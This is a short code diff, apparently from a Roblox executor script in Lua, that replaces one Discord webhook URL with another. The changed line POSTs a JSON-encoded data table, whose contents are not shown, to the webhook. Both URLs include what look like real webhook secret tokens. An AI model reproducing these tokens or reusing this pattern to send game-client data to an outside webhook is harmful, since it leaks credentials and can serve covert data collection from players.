@@ -27,7 +27,7 @@ local data = {
         }
     }
 }
-req({Url='https://discord.com/api/webhooks/1051349432769196072/V4Hcyys9WpFdltqfLa6v2cJGXQSr7LQrJAeB5f3RZvtE0BH0TBo2T5QfDc0NriwcHMDx',Body=game.HttpService:JSONEncode(data),Method='POST',Headers={['content-type']='application/json'}})
+req({Url='https://discord.com/api/webhooks/1207522068749484032/bHUuqvfyqnfE6oLvbUDIm6_Mps4hWvsZ2EboStZ65JzMsbluC6eMLwgW8Qmg32v6j3cd',Body=game.HttpService:JSONEncode(data),Method='POST',Headers={['content-type']='application/json'}})
 local http = game:GetService('HttpService')
 if writefile and isfile then
     if not isfile('discord.json') then
